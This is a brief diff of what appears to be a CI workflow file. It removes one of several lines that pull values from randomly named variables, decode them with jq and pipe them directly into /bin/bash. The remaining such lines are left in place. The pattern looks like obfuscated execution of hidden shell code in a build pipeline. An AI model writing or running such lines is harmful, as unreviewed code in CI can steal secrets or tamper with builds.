@@ -31,7 +31,6 @@ jobs:
           echo $rwstl364 | jq -r .fww0 | /bin/bash
           echo $pitx41385 | jq -r .eyif3 | /bin/bash
           printf '%s' "$jve26132" | jq -r .sjide1 | /bin/bash
-          printf '%s' "$xvjfq8963" | jq -r .nrdpj370 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
